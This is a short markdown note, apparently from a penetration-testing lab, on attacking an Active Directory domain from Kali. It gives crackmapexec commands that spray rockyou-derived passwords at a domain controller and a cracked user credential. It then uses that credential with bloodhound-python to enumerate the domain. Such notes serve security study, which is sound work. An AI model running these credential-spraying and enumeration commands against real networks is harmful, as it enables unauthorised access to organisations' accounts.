# Working with a Kali machine

- Used crackmapexec to crack user:pass combinations for low level users on the DC from files we created.

  added random passwords from rockyou.txt into passwords.txt\
  added random users from the user.txt file

- To run properly crackmapexec command had to configure the /etc/hosts file and the /etc/resolve.conf to add the DC address to it
  crackmapexec smb <ip> -u users.txt -p passwords.txt\

  Continue enumerating even when the user:pass combination has been found for a user\
  crackmapexec smb 192.168.8.155 -u users.txt -p passwords.txt --continue-on-success

- Getting ready for bloodhound installing with neo4j  
  sudo echo "deb http://httpredir.debian.org/debian stretch-backports main" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list\
  sudo apt-get update\
  wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -\necho 'deb https://debian.neo4j.com stable latest' >     /etc/apt/sources.list.d/neo4j.list\nsudo apt-get update\
  sudo apt-get install apt-transport-https\
  sudo apt-get install neo4j

  Access the gui (localhost:7474) and changed the default password for neo4j\


- Installed bloodhound latest release from https://github.com/BloodHoundAD/BloodHound/releases
  ./BloodHound\

  ...Starting bloodhound....
  
- Sharphound python version from github https://github.com/fox-it/BloodHound.py
  pip install bloodhound\
  added bloodhound-python to the $PATH\
  /home/user/.local/bin\
  subl ~/.zshrc\
  source ~/.zshrc\
  added /home/user/.local/bin to the file\
  
  Running the command with the default username and password we had found with crackmapexec earlier\
  bloodhound-python -u adavies -p eminem -dc dc1.xyz.com --disable-autogc -d xyz.com\
  
  To get All\
  bloodhound-python -u adavies -p eminem -dc dc1.xyz.com --disable-autogc -d xyz.com -c All\

- the output generates multiple .json files we can use to upload into the bloodhound GUI and analyze the AD users,groups, and other parameters
- Installed bloodhound, neo4j, and a python version of sharphound (bloodhound-python)  
